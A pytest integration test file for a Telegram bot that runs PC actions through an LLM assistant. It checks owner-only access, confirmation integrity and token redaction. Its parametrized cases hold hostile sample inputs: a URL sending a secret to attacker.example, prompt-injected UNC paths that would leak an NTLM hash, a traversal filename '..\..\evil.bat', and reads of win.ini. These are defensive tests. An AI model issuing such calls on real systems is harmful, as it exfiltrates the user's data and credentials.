"""Integration: build the REAL Application via bot.main.build_app() with a fake env, without
polling or network. All Bot API traffic is intercepted at telegram.Bot._post and every registered
action is replaced by a spy, so nothing real happens on the PC."""
from __future__ import annotations

import dataclasses
import re
from pathlib import Path

import pytest
import telegram
from telegram import Update
from telegram.ext import CallbackQueryHandler, CommandHandler, MessageHandler

from bot import automation as auto
from bot import config, main, security
from bot.actions import registry as reg
from bot.assistant import brain
from bot.modules import MODULE_NAMES

OWNER, STRANGER = 111, 999
ROOT = Path(__file__).resolve().parent.parent
_OWNER_ONLY_CODE = security.owner_only(lambda u, c: None).__code__


# ---------------------------------------------------------------- fixtures
@pytest.fixture
def fake_settings(monkeypatch):
    s = dataclasses.replace(config.settings, bot_token="123456:TEST", allowed_user_ids=frozenset({OWNER}))
    for mod in (config, main, security):
        monkeypatch.setattr(mod, "settings", s)
    return s


@pytest.fixture
def api(monkeypatch):
    """Intercept every Bot API call. Returns the list of (endpoint, data)."""
    calls: list[tuple[str, dict]] = []

    async def fake_post(self, endpoint, data=None, *a, **kw):
        if endpoint == "getMe":
            return {"id": 42, "is_bot": True, "first_name": "Edith", "username": "edith_test_bot"}
        calls.append((endpoint, dict(data or {})))
        if endpoint in ("answerCallbackQuery", "sendChatAction", "setMyCommands", "deleteMessage"):
            return True
        return {"message_id": len(calls), "date": 0, "chat": {"id": OWNER, "type": "private"}, "text": "ok"}

    monkeypatch.setattr(telegram.Bot, "_post", fake_post)
    return calls


@pytest.fixture
def app(fake_settings, api, tmp_path, monkeypatch):
    auto.set_store(auto.Store(tmp_path / "automation.db"))
    application = main.build_app()
    yield application
    auto.set_store(None)
    auto.set_app(None)


@pytest.fixture
def spies(app, monkeypatch):
    """Replace every registered action with a recorder (no real OS calls)."""
    ran: list[str] = []
    for name, act in list(reg.REGISTRY.items()):
        async def spy(*, __n=name, **kw):
            ran.append(__n)
            return reg.ActionResult(text=f"spy {__n}")
        monkeypatch.setitem(reg.REGISTRY, name, dataclasses.replace(act, func=spy))
    return ran


def all_handlers(application):
    return [h for group in application.handlers.values() for h in group]


# ---------------------------------------------------------------- structure
def test_every_module_loaded(app):
    import sys
    for name in MODULE_NAMES:
        mod = sys.modules.get(f"bot.modules.{name}")
        assert mod is not None, f"module {name} failed to import"
        assert mod.COMMANDS, name
    listed = {c for c, _ in main.ALL_COMMANDS}
    for name in MODULE_NAMES:
        mod = sys.modules[f"bot.modules.{name}"]
        assert {c for c, _ in mod.COMMANDS} <= listed, f"module {name} not registered"


def test_build_app_is_repeatable(fake_settings, api, tmp_path):
    """ALL_COMMANDS must not accumulate duplicates when build_app() runs twice."""
    auto.set_store(auto.Store(tmp_path / "a.db"))
    try:
        main.build_app()
        n = len(main.ALL_COMMANDS)
        main.build_app()
        assert len(main.ALL_COMMANDS) == n
    finally:
        auto.set_store(None)
        auto.set_app(None)


def test_no_duplicate_commands_and_valid_bot_commands(app):
    seen: dict[str, int] = {}
    for h in all_handlers(app):
        if isinstance(h, CommandHandler):
            for c in h.commands:
                seen[c] = seen.get(c, 0) + 1
    dups = sorted(c for c, n in seen.items() if n > 1)
    assert not dups, f"duplicate command handlers: {dups}"

    names = [c for c, _ in main.ALL_COMMANDS]
    assert len(names) == len(set(names)), "duplicate /help entries"
    assert len(names) <= 100, "Telegram allows at most 100 bot commands"
    for c, d in main.ALL_COMMANDS:
        assert re.fullmatch(r"[a-z0-9_]{1,32}", c), c
        assert 1 <= len(d), c
        assert c in seen, f"/{c} is listed in /help but has no handler"


def test_callback_prefixes_distinct_and_all_buttons_routed(app):
    prefixes = []
    for h in all_handlers(app):
        if isinstance(h, CallbackQueryHandler):
            pat = h.pattern.pattern if hasattr(h.pattern, "pattern") else h.pattern
            m = re.fullmatch(r"\^([a-z_]+):", pat or "")
            assert m, f"callback pattern must be ^<prefix>: , got {pat!r}"
            prefixes.append(m.group(1))
    assert len(prefixes) == len(set(prefixes)), prefixes
    assert "confirm" in prefixes
    assert set(MODULE_NAMES) - {"system", "power", "shell", "files", "desktop", "media", "assistant",
                                "automation"} == set()
    # every callback_data literal in the source must be routed to exactly one handler
    used = set()
    for py in (ROOT / "bot").rglob("*.py"):
        used |= set(re.findall(r'callback_data=f?"([a-z_]+):', py.read_text(encoding="utf-8")))
    assert used, "no callback_data found?"
    assert used <= set(prefixes), f"buttons without a handler: {used - set(prefixes)}"


def test_every_handler_is_owner_only(app):
    handlers = all_handlers(app)
    assert len(handlers) > 30
    for h in handlers:
        cb = h.callback
        assert getattr(cb, "__wrapped__", None) is not None and cb.__code__ is _OWNER_ONLY_CODE, \
            f"{type(h).__name__} {getattr(cb, '__qualname__', cb)} is not wrapped by owner_only"
    assert any(isinstance(h, MessageHandler) for h in handlers)


def test_every_action_has_valid_tool_schema(app):
    assert len(reg.REGISTRY) >= 40
    simple = {"string", "integer", "number", "boolean"}
    for name, act in reg.REGISTRY.items():
        assert re.fullmatch(r"[a-zA-Z0-9_-]{1,64}", name)
        tool = act.tool_schema()
        assert tool["name"] == name and tool["description"].strip()
        sch = tool["input_schema"]
        assert sch["type"] == "object" and sch["additionalProperties"] is False
        assert set(sch["required"]) <= set(sch["properties"]), name
        for pname, p in sch["properties"].items():
            t = p.get("type")
            assert t in simple | {"array"}, (name, pname, p)
            if t == "array":
                assert p["items"].get("type") in simple, (name, pname)
            if "enum" in p:
                assert p["enum"] and all(isinstance(v, (str, int, float, bool)) for v in p["enum"])
            if "default" in p and "enum" in p:
                assert p["default"] in p["enum"], (name, pname)
    # both provider formats build from the registry
    assert len(brain.openai_tools(reg.tool_schemas())) == len(reg.REGISTRY)
    assert len(brain.model_tools()) == len(reg.REGISTRY)


# ---------------------------------------------------------------- behaviour through the real app
def _msg_update(app, uid: int, text: str | None = None, **extra) -> Update:
    msg = {"message_id": 1, "date": 0, "chat": {"id": uid, "type": "private"},
           "from": {"id": uid, "is_bot": False, "first_name": "X"}, **extra}
    if text is not None:
        msg["text"] = text
        if text.startswith("/"):
            msg["entities"] = [{"type": "bot_command", "offset": 0, "length": len(text.split()[0])}]
    return Update.de_json({"update_id": 1, "message": msg}, app.bot)


def _cb_update(app, uid: int, data: str) -> Update:
    return Update.de_json({"update_id": 2, "callback_query": {
        "id": "cb1", "chat_instance": "ci", "data": data,
        "from": {"id": uid, "is_bot": False, "first_name": "X"},
        "message": {"message_id": 5, "date": 0, "chat": {"id": uid, "type": "private"},
                    "from": {"id": 42, "is_bot": True, "first_name": "Edith"}, "text": "menu"}}}, app.bot)


STRANGER_TEXTS = ["/start", "/help", "/status", "/cmd whoami", "/ps Get-Date", "/kill 1234", "/power",
                  "/lock", "/screenshot", "/webcam", "/get C:\\Windows\\win.ini", "/rm x", "/type hi",
                  "/j shut down the pc", "/remind 1m hi", "/macro run x", "/volume 50", "/clip"]
STRANGER_BUTTONS = ["power:shutdown", "confirm:deadbeefdeadbeef:y", "system:status", "files:o:1:0",
                    "desktop:shot", "media:mute", "assistant:voice:off", "automation:cancel:1", "shell:cd:home"]


async def test_unauthorized_updates_get_no_reply(app, api, spies):
    await app.initialize()
    try:
        # positive control: the harness really delivers updates (owner gets an answer)
        await app.process_update(_msg_update(app, OWNER, "/help"))
        assert any(e == "sendMessage" for e, _ in api), "harness broken: owner got no reply"
        await app.process_update(_msg_update(app, OWNER, "/status"))
        assert spies == ["system_status"]
        api.clear()
        spies.clear()

        for text in STRANGER_TEXTS:
            await app.process_update(_msg_update(app, STRANGER, text))
        await app.process_update(_msg_update(app, STRANGER, voice={
            "file_id": "v", "file_unique_id": "v", "duration": 1}))
        await app.process_update(_msg_update(app, STRANGER, document={
            "file_id": "d", "file_unique_id": "d", "file_name": "..\\..\\evil.bat"}))
        for data in STRANGER_BUTTONS:
            await app.process_update(_cb_update(app, STRANGER, data))

        assert spies == [], f"actions ran for a stranger: {spies}"
        # only a silent answerCallbackQuery (stops the button spinner) is allowed - no text
        bad = [(e, d) for e, d in api if e != "answerCallbackQuery" or d.get("text")]
        assert bad == [], f"stranger got replies: {bad}"
        assert len(api) == len(STRANGER_BUTTONS)
    finally:
        await app.shutdown()


async def test_error_handler_silent_for_strangers_and_redacts(app, api, fake_settings, monkeypatch):
    await app.initialize()
    try:
        ctx = type("Ctx", (), {"error": RuntimeError(f"boom https://api.telegram.org/bot{fake_settings.bot_token}/x")})()
        await main.on_error(_msg_update(app, STRANGER, "/status"), ctx)
        assert api == []
        await main.on_error(_msg_update(app, OWNER, "/status"), ctx)
        (endpoint, data), = api
        assert endpoint == "sendMessage" and fake_settings.bot_token not in data["text"]
        assert "[REDACTED]" in data["text"]
    finally:
        await app.shutdown()


async def test_help_is_valid_html_and_fits(app, api, spies):
    await app.initialize()
    try:
        await app.process_update(_msg_update(app, OWNER, "/help"))
        (endpoint, data), = [c for c in api if c[0] == "sendMessage"]
        text = data["text"]
        assert data.get("parse_mode") == "HTML" and len(text) <= 4096
        # only <b>..</b> markup may remain; '<pid|name>' style placeholders must be escaped
        assert "<" not in re.sub(r"</?b>", "", text)
        assert "&lt;pid|name&gt;" in text
    finally:
        await app.shutdown()


# ---------------------------------------------------------------- confirmation integrity
async def test_webcam_needs_confirm_everywhere(app, api, spies, monkeypatch):
    from bot import confirm
    asked = []

    async def deny(bot, chat_id, summary, **kw):
        asked.append(summary)
        return False
    monkeypatch.setattr(confirm, "ask_confirm", deny)
    assert reg.REGISTRY["webcam_photo"].dangerous
    await app.initialize()
    try:
        await app.process_update(_msg_update(app, OWNER, "/webcam"))
    finally:
        await app.shutdown()
    assert asked and "webcam" in asked[0].lower()
    assert spies == []


async def test_confirm_buttons_cannot_be_forged_reused_or_crossed(app, api, spies):
    import asyncio
    from bot import confirm
    await app.initialize()
    try:
        task = asyncio.create_task(confirm.ask_confirm(app.bot, OWNER, "Shut down?", timeout=5))
        for _ in range(5):
            await asyncio.sleep(0)
        (token,) = list(confirm._PENDING)
        # a stranger pressing the real token -> ignored
        await app.process_update(_cb_update(app, STRANGER, f"confirm:{token}:y"))
        assert not task.done()
        # the owner pressing it from ANOTHER chat (e.g. a group) -> ignored
        other = _cb_update(app, OWNER, f"confirm:{token}:y").to_dict()
        other["callback_query"]["message"]["chat"] = {"id": -100, "type": "group"}
        await app.process_update(Update.de_json(other, app.bot))
        assert not task.done()
        # forged/unknown token -> ignored
        await app.process_update(_cb_update(app, OWNER, "confirm:0000000000000000:y"))
        assert not task.done()
        # the real press in the right chat confirms exactly once
        await app.process_update(_cb_update(app, OWNER, f"confirm:{token}:y"))
        assert await task is True
        assert confirm._PENDING == {}
        api.clear()
        await app.process_update(_cb_update(app, OWNER, f"confirm:{token}:n"))  # replay
        assert [d.get("text") for e, d in api if e == "answerCallbackQuery"] == ["This confirmation expired."]
    finally:
        await app.shutdown()


# ---------------------------------------------------------------- Edith brain over the real registry
class _Bot:
    def __init__(self):
        self.sent = []

    def __getattr__(self, name):
        async def _send(*a, **kw):
            self.sent.append(name)
        return _send


@pytest.fixture
def brain_confirm(monkeypatch):
    state = {"answer": False, "asked": []}

    async def fake(bot, chat_id, summary, **kw):
        state["asked"].append((chat_id, summary))
        return state["answer"]
    monkeypatch.setattr(brain, "ask_confirm", fake)
    return state


def test_model_never_sees_chat_id(app):
    for t in brain.model_tools():
        assert "chat_id" not in t["input_schema"]["properties"], t["name"]
        assert "chat_id" not in t["input_schema"]["required"], t["name"]
    assert any("chat_id" in a.input_schema["properties"] for a in reg.REGISTRY.values())  # registry intact


async def test_brain_forces_chat_id_to_current_chat(app, monkeypatch, brain_confirm):
    seen = {}

    async def fake_cd(path: str = "", chat_id: int = 0):
        seen.update(path=path, chat_id=chat_id)
        return reg.ActionResult(text="ok")
    monkeypatch.setitem(reg.REGISTRY, "cd", dataclasses.replace(reg.REGISTRY["cd"], func=fake_cd))
    out, err = await brain.execute_tool(_Bot(), 777, "cd", {"path": "D:\\", "chat_id": 31337},
                                        brain.BrainReply(""))
    assert not err and seen == {"path": "D:\\", "chat_id": 777}


@pytest.mark.parametrize("name,args", [
    ("open_url", {"url": "https://attacker.example/?q=secret"}),   # exfiltration sink
    ("webcam_photo", {}),                                          # privacy
    ("shell_cmd", {"command": "whoami"}),
    ("delete_path", {"path": "C:\\important"}),
    ("schedule_action", {"kind": "in", "when": "1m", "steps": "shell_cmd whoami"}),
    ("run_macro", {"name": "x"}),
])
async def test_brain_cannot_run_sensitive_actions_without_confirm(app, spies, brain_confirm, name, args):
    reply = brain.BrainReply("")
    out, err = await brain.execute_tool(_Bot(), 111, name, args, reply)
    assert err and "NOT run" in out
    assert spies == [] and reply.declined == [name]
    assert brain_confirm["asked"] and brain_confirm["asked"][0][0] == 111


async def test_brain_safe_reads_need_no_confirm(app, spies, brain_confirm):
    for name, args in [("screenshot", {}), ("system_status", {}), ("get_file", {"path": "x.txt"})]:
        out, err = await brain.execute_tool(_Bot(), 111, name, args, brain.BrainReply(""))
        assert not err, (name, out)
    assert spies == ["screenshot", "system_status", "get_file"] and brain_confirm["asked"] == []


@pytest.mark.parametrize("name,args", [
    ("list_dir", {"path": r"\\attacker.example\share"}),
    ("get_file", {"path": "//attacker.example/share/x.txt"}),
    ("find_files", {"pattern": "*", "root": r'"\\10.0.0.5\c$"'}),
    ("cd", {"path": r"\\?\UNC\attacker\share"}),
    ("make_dir", {"path": "\\/attacker/share/x"}),
])
async def test_brain_network_paths_need_confirm(app, spies, brain_confirm, name, args):
    """Prompt-injected UNC paths would leak the NTLM hash over SMB: Edith must ask first."""
    out, err = await brain.execute_tool(_Bot(), 111, name, args, brain.BrainReply(""))
    assert err and "NOT run" in out and spies == []
    assert brain.needs_confirm(name, args)
    assert not brain.needs_confirm(name, {"path": r"C:\Users\me\Documents", "pattern": "x", "root": "docs"})


def test_every_action_classified(app):
    """Anything that changes PC state irreversibly or touches input/power/processes/camera
    must be dangerous; open_url additionally needs a Confirm when Edith calls it."""
    must_be_dangerous = {"shell_cmd", "shell_ps", "run_program", "delete_path", "move_path", "kill_process",
                         "type_text", "press_hotkey", "mouse_control", "webcam_photo", "schedule_action",
                         "create_trigger", "save_macro", "run_macro"} | {
                         n for n in reg.REGISTRY if n.startswith("power_") and n != "power_abort"}
    for n in must_be_dangerous:
        assert reg.REGISTRY[n].dangerous, n
        assert brain.needs_confirm(n)
    assert brain.needs_confirm("open_url") and not reg.REGISTRY["open_url"].dangerous


# ---------------------------------------------------------------- secrets
def test_log_formatter_redacts_token_and_keys(fake_settings, monkeypatch):
    import logging
    import sys
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-api03-SECRETSECRETSECRET")
    fmt = security.RedactingFormatter("%(message)s")
    try:
        raise RuntimeError(f"POST https://api.telegram.org/bot{fake_settings.bot_token}/getUpdates failed")
    except RuntimeError:
        rec = logging.LogRecord("x", logging.ERROR, __file__, 1, "key=%s",
                                ("sk-ant-api03-SECRETSECRETSECRET",), sys.exc_info())
    out = fmt.format(rec)
    assert fake_settings.bot_token not in out and "SECRETSECRET" not in out
    assert out.count("[REDACTED]") >= 2
    assert "1234567890:" not in security.redact("token 1234567890:AAH" + "x" * 35)


def test_httpx_request_logging_silenced():
    import logging
    assert logging.getLogger("httpx").getEffectiveLevel() >= logging.WARNING
    assert logging.getLogger("httpcore").getEffectiveLevel() >= logging.WARNING
